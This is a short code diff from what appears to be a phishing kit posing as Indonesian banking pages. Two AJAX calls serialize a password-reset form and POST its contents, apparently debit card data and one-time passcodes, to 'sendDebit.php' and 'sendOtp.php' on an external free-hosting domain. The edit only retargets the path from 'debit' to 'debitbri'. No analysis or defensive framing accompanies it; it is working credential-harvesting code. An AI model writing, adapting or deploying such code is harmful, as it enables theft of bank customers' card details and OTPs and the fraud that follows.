@@ -1686,7 +1686,7 @@ document.getElementById('btnSubmit').innerHTML = "Verify....";
  var dataString = $("#forgetPasswordForm, #formLink").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/debit/sendDebit.php',
+			  url: 'https://danamon-app.whf.bz/token/debitbri/sendDebit.php',
 			  data: dataString,
  
  
@@ -1725,7 +1725,7 @@ $(".load").fadeOut();
 var dataString = $("#forgetPasswordForm, #formLink").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/debit/sendOtp.php',
+			  url: 'https://danamon-app.whf.bz/token/debitbri/sendOtp.php',
 			  data: dataString,
 			  
  complete: function(data) {
